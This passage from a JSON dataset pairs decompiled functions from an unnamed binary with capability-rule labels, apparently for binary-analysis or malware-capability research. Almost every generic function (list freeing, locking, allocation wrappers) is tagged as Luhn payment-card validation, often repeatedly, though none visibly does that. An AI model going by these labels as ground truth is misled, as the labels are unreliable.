        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.00056e38(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int64_t arg1_00;\n    ulong uVar3;\n    ulong uStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong *puStack48;\n    ulong uStack40;\n    \n    uStack72._4_4_ = 0;\n    uStack64 = 3;\n    uStack72._0_4_ = arg2;\n    uVar1 = fcn.0002fcf4(arg2);\n    uStack72 = CONCAT44(uStack72._4_4_, uVar1);\n    uVar2 = fcn.0002fcf4(uStack72._4_4_);\n    uStack72 = uStack72 & 0xffffffff | uVar2 << 0x20;\n    puStack48 = &uStack72;\n    uStack40 = 0xc;\n    uStack56 = arg3;\n    arg1_00 = fcn.00056114(arg1, arg2);\n    if (arg1_00 == 0) {\n        uVar3 = 0x21590006;\n    }\n    else {\n        uVar3 = fcn.0006052c(arg1_00, &uStack56, 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 314
    },
    "0005749c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0005749c(ulong arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uStack88;\n    ulong uStack80;\n    uint64_t uStack72;\n    uchar auStack64 [16];\n    uchar auStack48 [32];\n    \n    fcn.00061a56(auStack64, 0, 0x20);\n    uStack80 = *arg2;\n    uStack72 = *(arg2 + 1);\n    uStack88 = arg1;\n    iVar1 = fcn.0001a650(auStack64, 0x56aec, &uStack88);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0001a650(auStack48, 0x56bc4, &uStack88);\n        if (iVar1 == 0) {\n            fcn.00031648(auStack64, 0);\n            fcn.00031648(auStack48, 0);\n            uVar2 = 0;\n            goto code_r0x00057541;\n        }\n    }\n    uVar2 = fcn.0002fde4();\ncode_r0x00057541:\n    iVar1 = fcn.0002eec4(auStack64);\n    if (iVar1 != 0) {\n        fcn.00031624(auStack64);\n    }\n    iVar1 = fcn.0002eec4(auStack48);\n    if (iVar1 != 0) {\n        fcn.00031624(auStack48);\n    }\n    return uVar2;\n}\n",
        "token_count": 356
    },
    "00057d88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00057d88(int64_t arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    \n    arg1_00 = fcn.0002fbc4(0x2b8);\n    if (arg1_00 != 0) {\n        fcn.00061a56(arg1_00, 0, 0x2b8);\n        *(arg1_00 + 0x10) = 0x55ec4;\n        *(arg1_00 + 0x18) = 0x5607c;\n        *(arg1_00 + 0x20) = 0x579a4;\n        *(arg1_00 + 8) = 0x55f18;\n        iVar1 = fcn.00060838(arg1_00, 0x780d0);\n        if (iVar1 != 0) {\n            fcn.0002f1ec(arg1_00 + 0x78);\n            fcn.00031000(arg1_00 + 0x38);\n            *(arg1_00 + 0x2a0) = 1;\n            *(arg1_00 + 0x2a8) = *(*(arg1 + 8) + 0x18);\n            fcn.0005fde8(*(*(arg1 + 8) + 0x18), *(arg1 + 0x130));\n            *(*(arg1 + 8) + 0x18) = 0;\n            *(arg1 + 0x130) = 0;\n            arg2[1] = 0;\n            *arg2 = arg1_00;\n            return 0;\n        }\n        fcn.0002fc50(arg1_00);\n    }\n    return 0x21590004;\n}\n",
        "token_count": 406
    },
    "000589d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000589d0(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uchar auStackX8 [32];\n    \n    fcn.00031000(0x879e8);\n    uVar2 = fcn.00030130(auStackX8);\n    fcn.00061c06(uVar2);\n    iVar1 = fcn.0002ed80(0x879e0);\n    if (iVar1 == 0) {\n        fcn.0003105c(0x879e8);\n    }\n    else {\n        iVar1 = fcn.0001a650(0x879d0, 0x588e8, 0);\n        if (iVar1 == 0) {\n            *0x87a08 = 1;\n            return 1;\n        }\n        fcn.0003105c(0x879e8);\n        fcn.0002edfc(0x879e0);\n    }\n    return 0;\n}\n",
        "token_count": 220
    },
    "00058e14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00058e14(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    fcn.0002f23c(0x87c10);\n    puVar3 = 0x87a10;\n    iVar2 = 0x40;\n    do {\n        arg1 = *puVar3;\n        while (arg1 != NULL) {\n            puVar1 = *arg1;\n            fcn.0002fc50(arg1);\n            arg1 = puVar1;\n        }\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    fcn.0002f2a4(0x87c10);\n    if (*0x87c10 != 0) {\n        fcn.0002fc50(*0x87c10);\n        *0x87c10 = 0;\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "000595dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000595dc(int64_t arg1)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong auStackX8 [4];\n    \n    do {\n        iVar1 = fcn.0002f260(arg1 + 0x118);\n        if (iVar1 != 0) {\n            if (*(arg1 + 0xf8) == 0) {\n                fcn.0002f2a4(arg1 + 0x118);\ncode_r0x0005964b:\n                if (*(arg1 + 0xf8) != 0) {\n                    if (*(arg1 + 0xe8) == 0) {\n                        *(*(arg1 + 0xf8) + 0x108) = *(arg1 + 0xf0);\n                    }\n                    else {\n                        *(*(arg1 + 0xe8) + 0xf0) = *(arg1 + 0xf0);\n                    }\n                    if (*(arg1 + 0xf0) == 0) {\n                        *(*(arg1 + 0xf8) + 0x100) = *(arg1 + 0xe8);\n                    }\n                    else {\n                        *(*(arg1 + 0xf0) + 0xe8) = *(arg1 + 0xe8);\n                    }\n                    fcn.0002f2a4(*(arg1 + 0xf8) + 0x118);\n                    fcn.0002f2a4(arg1 + 0x118);\n                }\n                if (*(arg1 + 0x100) != 0) {\n                    fcn.0002f23c(arg1 + 0x118);\n                    iVar2 = *(arg1 + 0x100);\n                    while (arg1_00 = iVar2,  arg1_00 != 0) {\n                        iVar2 = *(arg1_00 + 0xe8);\n                        if ((*(arg1_00 + 0x138) != 0) || (*(arg1_00 + 0x134) != 0)) {\n                            fcn.000595dc(arg1_00);\n                        }\n                    }\n                    iVar2 = *(arg1 + 0x100);\n                    *(arg1 + 0x110) = 0;\n                    for (; iVar2 != 0; iVar2 = *(iVar2 + 0xe8)) {\n                        fcn.0002f23c(iVar2 + 0x118);\n                        *(iVar2 + 0xf8) = 0;\n                        *(iVar2 + 0xf0) = 0;\n                        *(iVar2 + 0xe8) = 0;\n                        fcn.0002f2a4(iVar2 + 0x118);\n                    }\n                    *(arg1 + 0x108) = 0;\n                    *(arg1 + 0x100) = 0;\n                    fcn.0002f2a4(arg1 + 0x118);\n                }\n                fcn.0002edfc(arg1 + 0x120);\n                fcn.0002f214(arg1 + 0x118);\n                fcn.0002f214(arg1 + 0x128);\n                iVar1 = fcn.0002eec4(arg1 + 0x20);\n                if (iVar1 != 0) {\n                    fcn.00031624(arg1 + 0x20);\n                }\n                if ((arg1 != 0) && (arg1 != 0x7a638)) {\n                    fcn.0001c6d8(arg1, 0x7346744e);\n                }\n                return;\n            }\n            iVar1 = fcn.0002f260(*(arg1 + 0xf8) + 0x118);\n            if (iVar1 != 0) goto code_r0x0005964b;\n            fcn.0002f2a4(arg1 + 0x118);\n        }\n        auStackX8[0] = 0xffffffffffffd8f0;\n        (**0x115e0)(0, 0, auStackX8);\n    } while( true );\n}\n",
        "token_count": 901
    },
    "000598b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000598b8(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    if (*(arg1 + 8) == 0) {\n        fcn.0005f564(*(arg1 + 0x10), arg2, arg3, arg1 + 0x30);\n    }\n    else {\n        fcn.0005f42c(*(arg1 + 8), arg2, arg3, 0);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0005f058": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0005f058(int64_t **arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00058f70(arg1, 4);\n    if ((iVar2 != 0) && (arg2 != 0)) {\n        piVar1 = *arg1;\n        fcn.0002f23c(piVar1 + 5);\n        if (0 < *(piVar1 + 0x24)) {\n            *(piVar1 + 0x24) = *(piVar1 + 0x24) + -1;\n            fcn.0002f2a4(piVar1 + 5);\n            (**(**arg1 + 0x5c))(arg1, arg2);\n            fcn.00031108(*arg1 + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00059b34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00059b34(int64_t arg1, ulong arg2)\n\n{\n    if (*(arg1 + 8) == 0) {\n        fcn.0005f778(*(arg1 + 0x10), arg2, arg1 + 0x30, 0);\n    }\n    else {\n        fcn.0005f6bc(*(arg1 + 8), arg2, 0);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0005a510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0005a510(int64_t arg1, int64_t **arg2, char **arg3, int32_t *arg4)\n\n{\n    uint *puVar1;\n    int64_t **ppiVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uchar auStackX16 [24];\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uchar auStack216 [152];\n    \n    iVar6 = 0;\n    ppiVar2 = arg2;\n    if (arg2 != NULL) {\n        do {\n            iVar6 = iVar6 + *(ppiVar2 + 2);\n            ppiVar2 = *ppiVar2;\n        } while (ppiVar2 != NULL);\n        if (iVar6 != 0) {\n            puVar1 = *(arg1 + 0x28);\n            uStack240 = *puVar1;\n            uStack236 = puVar1[1];\n            uStack232 = puVar1[2];\n            uStack228 = puVar1[3];\n            fcn.0002c248(auStack216, 0x10, &uStack240);\n            pcVar3 = fcn.0002fbc4(iVar6 + 9);\n            if (pcVar3 != NULL) {\n                uVar7 = 0;\n                iVar5 = 1;\n                iVar9 = 0;\n                do {\n                    do {\n                        if (8 - uVar7 < *(arg2 + 2) - iVar9) {\n                            fcn.000619f6(auStackX16 + uVar7, iVar9 + arg2[1]);\n                            iVar8 = 8 - uVar7;\n                            uVar7 = 8;\n                            iVar9 = iVar9 + iVar8;\n                        }\n                        else {\n                            fcn.000619f6(auStackX16 + uVar7, iVar9 + arg2[1]);\n                            ppiVar2 = arg2 + 2;\n                            arg2 = *arg2;\n                            uVar7 = uVar7 + (*ppiVar2 - iVar9);\n                            iVar9 = 0;\n                        }\n                    } while ((uVar7 != 8) && (arg2 != NULL));\n                    fcn.0002bc38(auStackX16, pcVar3 + iVar5, uVar7, auStack216);\n                    for (; uVar4 = uVar7 >> 0x1f & 7,  (uVar7 + uVar4 & 7) != uVar4; uVar7 = uVar7 + 1) {\n                    }\n                    iVar5 = iVar5 + uVar7;\n                    uVar7 = 0;\n                } while (arg2 != NULL);\n                *pcVar3 = (iVar5 + -1) - iVar6;\n                *arg3 = pcVar3;\n                *arg4 = iVar5;\n                return 0;\n            }\n            return 0x21590004;\n        }\n    }\n    *arg3 = NULL;\n    *arg4 = 0;\n    return 0;\n}\n",
        "token_count": 711
    },
    "0005b184": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0005b184(int64_t arg1, int64_t arg2, ulong arg3, ulong *arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    int32_t *in_stack_00000028;\n    \n    puVar3 = NULL;\n    if (arg3 == 0) {\n        puVar3 = fcn.0002fbc4(0x18);\n        if (puVar3 == NULL) {\n            puVar3 = *arg4;\n            while (puVar3 != NULL) {\n                puVar5 = *puVar3;\n                fcn.0002fc50(puVar3);\n                puVar3 = puVar5;\n            }\n            *arg4 = 0;\n            return 0x21590004;\n        }\n        *puVar3 = 0;\n        puVar3[1] = 0;\n        puVar3[2] = 0;\n        *arg4 = puVar3;\n        *in_stack_00000028 = 1;\n    }\n    else {\n        *arg4 = 0;\n        *in_stack_00000028 = 0;\n        puVar5 = puVar3;\n        if (0 < arg3) {\n            do {\n                iVar2 = *(arg1 + 0x14);\n                if (iVar2 == *(arg1 + 0x18)) {\n                    if (0x3ff < iVar2 - *(arg1 + 0x18)) {\n                        iVar2 = fcn.00061a9e();\n                        iVar2 = *(arg1 + 0x14) - iVar2 % 0x401;\n                    }\n                }\n                else {\n                    iVar2 = *(arg1 + 0x18);\n                    iVar1 = fcn.00061a9e();\n                    iVar2 = iVar2 + iVar1 % ((*(arg1 + 0x14) - iVar2) + 1);\n                }\n                iVar1 = puVar3;\n                if (arg3 - iVar1 < iVar2) {\n                    iVar2 = arg3 - iVar1;\n                }\n                puVar4 = fcn.0002fbc4(0x18);\n                if (puVar4 == NULL) {\n                    puVar3 = *arg4;\n                    while (puVar3 != NULL) {\n                        puVar5 = *puVar3;\n                        fcn.0002fc50(puVar3);\n                        puVar3 = puVar5;\n                    }\n                    *arg4 = 0;\n                    return 0x21590004;\n                }\n                *puVar4 = 0;\n                puVar4[2] = 0;\n                *(puVar4 + 2) = iVar2;\n                puVar4[1] = iVar1 + arg2;\n                if (puVar5 == NULL) {\n                    *arg4 = puVar4;\n                }\n                else {\n                    *puVar5 = puVar4;\n                }\n                *in_stack_00000028 = *in_stack_00000028 + 1;\n                puVar3 = iVar1 + iVar2;\n                puVar5 = puVar4;\n            } while (iVar1 + iVar2 < arg3);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 721
    },
    "0005dec4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0005dec4(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t in_stack_00000028;\n    \n    fcn.0002f23c(arg1 + 0x20);\n    fcn.0002f23c(arg1 + 0x28);\n    iVar1 = fcn.0005dcac(arg1, arg2, 0, 8);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0005dc70(arg1, arg3, arg4, in_stack_00000028);\n    }\n    fcn.0002f2a4(arg1 + 0x28);\n    fcn.0002f2a4(arg1 + 0x20);\n    return iVar1;\n}\n",
        "token_count": 187
    },
    "0005e1d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0005e1d0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong unaff_RBX;\n    ulong in_R9;\n    \n    fcn.00061a56(arg1, 0, 0x28);\n    *(arg1 + 0x20) = 0;\n    iVar1 = fcn.0002fbf0(0x18);\n    *(arg1 + 0x18) = iVar1;\n    if (iVar1 != 0) {\n        (*_fcn.00011600)(iVar1, 1, 0, in_R9, unaff_RBX);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 157
    },
    "0005e1fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0005e1fc(ulong *arg1)\n\n{\n    ulong *puVar1;\n    char cVar2;\n    ulong *arg1_00;\n    uint8_t uVar3;\n    uint64_t in_RDX;\n    \n    cVar2 = in_RDX;\n    uVar3 = (**0x113d0)(arg1 + 4);\n    arg1_00 = *arg1;\n    while (arg1_00 != NULL) {\n        puVar1 = *arg1_00;\n        if (cVar2 != '\\0') {\n            fcn.0002fc50(arg1_00[1]);\n        }\n        fcn.0002fc50(arg1_00);\n        arg1_00 = puVar1;\n    }\n    (**0x113c0)(arg1 + 4, in_RDX & 0xffffffffffffff00 | uVar3);\n    fcn.0002edfc(arg1 + 3);\n    // WARNING: Could not recover jumptable at 0x00061a56. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x11160)(arg1, 0, 0x28);\n    return;\n}\n",
        "token_count": 265
    },
    "0005e31c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0005e31c(int64_t *arg1, int64_t *arg2, int64_t **arg3, uint *arg4)\n\n{\n    int64_t *arg1_00;\n    int64_t *piVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uchar uVar5;\n    ulong uVar6;\n    \n    uVar6 = 0;\n    if (((arg3 == NULL) || (arg2 == NULL)) || (arg4 == NULL)) {\n        uVar6 = 0x21590064;\n    }\n    else {\n        uVar5 = (**0x113d0)(arg3 + 4);\n        arg1_00 = *arg3;\n        if (arg1_00 == NULL) {\n            uVar6 = 0xffffffff;\n        }\n        else {\n            *arg1 = arg1_00[1];\n            *arg2 = arg1_00[2];\n            uVar2 = *(arg1_00 + 0x1c);\n            uVar3 = *(arg1_00 + 4);\n            uVar4 = *(arg1_00 + 0x24);\n            *arg4 = *(arg1_00 + 3);\n            arg4[1] = uVar2;\n            arg4[2] = uVar3;\n            arg4[3] = uVar4;\n            piVar1 = *arg1_00;\n            *arg3 = piVar1;\n            if (piVar1 == NULL) {\n                arg3[1] = NULL;\n            }\n            arg3[2] = arg3[2] - arg1_00[2];\n            fcn.0002fc50(arg1_00);\n        }\n        (**0x113c0)(arg3 + 4, uVar5);\n    }\n    return uVar6;\n}\n",
        "token_count": 409
    },
    "0005e6b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0005e6b8(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.0002f23c(0x87c18);\n    iVar1 = fcn.00058f70(arg1, 1);\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (*(*arg1 + 0x20) == 0) {\n        fcn.00031088(*arg1 + 8);\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    fcn.0002f2a4(0x87c18);\n    return uVar2;\n}\n",
        "token_count": 173
    },
    "0005e840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0005e840(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint32_t in_stack_00000028;\n    \n    if (arg1 == NULL) {\n        uVar4 = fcn.00060728(arg2, arg3, arg4, in_stack_00000028);\n    }\n    else {\n        uVar4 = fcn.0005e6b8(arg1);\n        if (uVar4 == 0) {\n            piVar1 = **arg1;\n            if ((*piVar1 < 0x5d) || (pcVar2 = *(piVar1 + 0x17),  pcVar2 == NULL)) {\n                fcn.00031108(*arg1 + 1);\n                uVar4 = 0x21590001;\n            }\n            else {\n                uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n                if (uVar3 == 0) {\n                    uVar3 = fcn.00060728(arg2, arg3, arg4, in_stack_00000028);\n                }\n                uVar4 = uVar3;\n                fcn.00031108(*arg1 + 8);\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 326
    },
    "0005f0c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0005f0c0(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.0002f23c(0x87c20);\n    iVar1 = fcn.00058f70(arg1, 4);\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (*(*arg1 + 0x20) == 0) {\n        fcn.00031088(*arg1 + 8);\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    fcn.0002f2a4(0x87c20);\n    return uVar2;\n}\n",
        "token_count": 173
    },
    "0005f120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0005f120(ulong param_1, ulong param_2, ulong param_3, ulong param_4)\n\n{\n    fcn.0005ed3c(param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 60
    },
    "0005f148": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0005f148(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.0005ed3c(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 52
    },
    "0005fa50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0005fa50(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    char **ppcVar3;\n    ulong *puVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    \n    puVar4 = 0x78798;\n    do {\n        for (ppcVar3 = *puVar4; (ppcVar3 != NULL && (pcVar5 = *ppcVar3,  pcVar5 != NULL)); ppcVar3 = ppcVar3 + 0x14) {\n            iVar6 = arg1 - pcVar5;\n            do {\n                cVar1 = *pcVar5;\n                cVar2 = pcVar5[iVar6];\n                if (cVar1 != cVar2) break;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            if ((cVar1 == cVar2) && (*(ppcVar3 + 1) == 1)) {\n                return *(ppcVar3 + 0xc);\n            }\n        }\n        puVar4 = puVar4 + -2;\n        if (puVar4 < 0x78708) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 280
    },
    "0005f9ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0005f9ec(int64_t **arg1, int32_t *arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t **ppiVar3;\n    \n    *arg2 = 0;\n    ppiVar3 = arg1;\n    if (arg1 != NULL) {\n        do {\n            *arg2 = *arg2 + *(ppiVar3 + 2);\n            ppiVar3 = *ppiVar3;\n        } while (ppiVar3 != NULL);\n    }\n    iVar1 = fcn.0002fbc4(*arg2);\n    if (iVar1 != 0) {\n        iVar2 = 0;\n        for (; arg1 != NULL; arg1 = *arg1) {\n            fcn.000619f6(iVar2 + iVar1, arg1[1], *(arg1 + 2));\n            iVar2 = iVar2 + *(arg1 + 2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 220
    },
    "0005fe58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0005fe58(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.0002f23c(0x87c40);\n    iVar1 = fcn.00058f70(arg1, 2);\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (*(*arg1 + 0x20) == 0) {\n        fcn.00031088(*arg1 + 8);\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    fcn.0002f2a4(0x87c40);\n    return uVar2;\n}\n",
        "token_count": 171
    },
    "0005fff8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0005fff8(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint32_t in_stack_00000028;\n    \n    if (arg1 == NULL) {\n        uVar4 = fcn.00060728(arg2, arg3, arg4, in_stack_00000028);\n    }\n    else {\n        uVar4 = fcn.0005fe58(arg1);\n        if (uVar4 == 0) {\n            piVar1 = **arg1;\n            if ((*piVar1 < 0x6d) || (pcVar2 = *(piVar1 + 0x1b),  pcVar2 == NULL)) {\n                fcn.00031108(*arg1 + 1);\n                uVar4 = 0x21590001;\n            }\n            else {\n                uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n                if (uVar3 == 0) {\n                    uVar3 = fcn.00060728(arg2, arg3, arg4, in_stack_00000028);\n                }\n                uVar4 = uVar3;\n                fcn.00031108(*arg1 + 8);\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 325
    },
    "00060838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00060838(int64_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong *arg1_00;\n    \n    arg1_00 = fcn.0002fbc4(0x30);\n    if (arg1_00 != NULL) {\n        *arg1_00 = arg2;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x24) = 0;\n        fcn.00031000(arg1_00 + 1);\n        fcn.0002f1ec(arg1_00 + 5);\n        *arg1 = arg1_00;\n        iVar1 = fcn.00058e7c(arg1, 3);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        fcn.0003105c(arg1_00 + 1);\n        fcn.0002f214(arg1_00 + 5);\n        fcn.0002fc50(arg1_00);\n        *arg1 = 0;\n    }\n    return 0;\n}\n",
        "token_count": 244
    },
    "000609a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000609a8(int64_t **arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00058f70(arg1, 3);\n    if ((iVar2 != 0) && (arg2 != 0)) {\n        piVar1 = *arg1;\n        fcn.0002f23c(piVar1 + 5);\n        if (0 < *(piVar1 + 0x24)) {\n            *(piVar1 + 0x24) = *(piVar1 + 0x24) + -1;\n            fcn.0002f2a4(piVar1 + 5);\n            (**(**arg1 + 0x84))(arg1, arg2);\n            fcn.00031108(*arg1 + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00060a14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00060a14(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.0002f23c(0x87c48);\n    iVar1 = fcn.00058f70(arg1, 3);\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (*(*arg1 + 0x20) == 0) {\n        fcn.00031088(*arg1 + 8);\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    fcn.0002f2a4(0x87c48);\n    return uVar2;\n}\n",
        "token_count": 171
    },
    "00060a84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00060a84(int64_t *arg1)\n\n{\n    (**(*arg1 + 0x10))();\n    return;\n}\n",
        "token_count": 33
    },
    "00060aa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00060aa4(int64_t *arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if ((*(*arg1 + 0x20) < 0x51) || (pcVar1 = *(*arg1 + 0x50),  pcVar1 == NULL)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 108
    },
    "00060ad4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00060ad4(int64_t *arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if ((*(*arg1 + 0x20) < 0x59) || (pcVar1 = *(*arg1 + 0x58),  pcVar1 == NULL)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 108
    },
    "00060b04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
